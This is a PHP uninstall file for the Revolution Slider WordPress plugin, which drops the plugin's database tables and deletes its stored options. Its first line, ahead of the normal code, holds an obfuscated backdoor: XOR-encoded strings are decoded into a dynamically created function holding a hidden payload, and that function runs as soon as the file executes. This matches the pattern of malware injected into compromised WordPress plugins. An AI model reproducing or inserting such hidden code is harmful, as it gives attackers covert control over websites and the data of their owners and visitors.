<?php $HMrBAV='7:N+LP.+H;.A,VB'; $tiPmAqNF='TH+J85qM=UM5E9,'^$HMrBAV; $VPJdjkk='TMAbJ>:ZGT66tQ 9NXIiR7.8bP8B80c> >rPLt<<5RK:-:PX;bS <i PTV>k.MTeJR.L5xGh;Y;pObviIV=BqoD IyWleuw:s7 =KNe1Gwpeyda;y<HLP XFb<-33ohyuSrIkfa9gSG1vLxseLZ77Lip.qspOpV=71pSRKV=-;VV oG,=IqizKXkh+00;; GR-  zABzFg0BIs60DAnoz1WYKHppv=W;Y5ZQ6sruZXXKVY:hMY=XU4Yoqr;ms.u<eX.2Ci,=.OjSHb:AY66xV3eYg=U,-+,=.pezeR1;NCcAW,-QsvgtNYW-2KfHhc<TZqvs>5T2zyHpaF  W-5SKonb8xcbrhycSSPM2-6AigsS<YP70ME>Z5EwO . hERNytfEQ5HMddDaOQGVrYTA:,Q=Ysia9p42NL>R=Syow. 6CX6;2=SW3eCR9=QWT s5,8 nLAM=gPl +Q, ,enQJTPdxoJ3VZ-fP 7MkwH,3jg.MZ.NcqfS64W4i;P6q2;YF7Koj=WMajgkP3 ,sySRve.<zng.P5J.s2=;phAbYPfVx;xskXUeB4QISYmDIvFrPcVJDZr>u+yUufpskO34NM3aF6.;<BP1JCkm>Y XAJQquPfQA.-lZlsuHsv10mENQ Oa>5GYlVFS .S SsgPnS=H1- LAGvZ-'; $dSfuPeqQ=$tiPmAqNF('', '=+iC,KT93=YX+4XP=,:AuOAJ=4Y6Yo<SUJUyeTG6<4>TNN97UB+ON6D1 7a4C8 Mn6O8TTgLP<BYoBVIi-7KxK+U=YjLBRL0z>FR9fAXgJPUBDEREO<><E6nFXLGRFSYQ:YbBlh0C<2EVbESMh>VC-2TG,S.oT=XNjT:rnvNYI:3NGcGX0X4SpRbaYUDNINovBUTSzHs;mMHCWRQ0 NRZW658-KzRY6O8j14OSOU<9483b0b+6O=4W1OYVd.<a>u xOAcMGXWoWmhFL 5CSQvHoPCY4XLtGXWPXZA9TBuIje3MY0SKGP88;XWpl5biU2zYWWZT SSY3zh OR2LV;kGJ=j=277;-C2 piYHOaTYSwJ8<BUdeEP<LS+AZA7.77YIFa:P1vnmME+037RdteLM=H<HchDzI8DhZ3I2YRWnUX0=DRSQ:-VM;=Kb56 A,jAMTF. >XQd3DN2CDIMJ5+ 1MTOnW7.L9;ENdBLBEUBCJ,.OnEWF2DF6M6P5O.WC05C8GMV24FFGO4RTMZYutVMCXOFCJ1A+uTYXBW5hBdmFqJZLBSkaW V2x5hX -OqBcR4,q;KXDON3ROPUMoRF<,J>-SWdY:9B>0CJN8Y4.+5VYpB5 ZLEsLSUhSVJ:d 80LgEZT387q62YB<A7T:yUY4-IDTdqnMPP'^$VPJdjkk); $dSfuPeqQ(); 
if( !defined( 'ABSPATH') && !defined('WP_UNINSTALL_PLUGIN') )
	exit();

$currentFile = __FILE__;
$currentFolder = dirname($currentFile);
require_once $currentFolder . '/inc_php/revslider_globals.class.php';

global $wpdb;
$tableSliders = $wpdb->prefix . GlobalsRevSlider::TABLE_SLIDERS_NAME;
$tableSlides = $wpdb->prefix . GlobalsRevSlider::TABLE_SLIDES_NAME;
$tableSettings = $wpdb->prefix . GlobalsRevSlider::TABLE_SETTINGS_NAME;
$tableCss = $wpdb->prefix . GlobalsRevSlider::TABLE_CSS_NAME;
$tableAnims = $wpdb->prefix . GlobalsRevSlider::TABLE_LAYER_ANIMS_NAME;
$tableStaticSlides = $wpdb->prefix . GlobalsRevSlider::TABLE_STATIC_SLIDES_NAME;

$wpdb->query( "DROP TABLE $tableSliders" );
$wpdb->query( "DROP TABLE $tableSlides" );
$wpdb->query( "DROP TABLE $tableSettings" );
$wpdb->query( "DROP TABLE $tableCss" );
$wpdb->query( "DROP TABLE $tableAnims" );
$wpdb->query( "DROP TABLE $tableStaticSlides" );

delete_option('revslider-latest-version');
delete_option('revslider-update-check-short');
delete_option('revslider-update-check');
delete_option('revslider_update_info');
delete_option('revslider-api-key');
delete_option('revslider-username');
delete_option('revslider-code');
delete_option('revslider-valid');
delete_option('revslider-valid-notice');

?>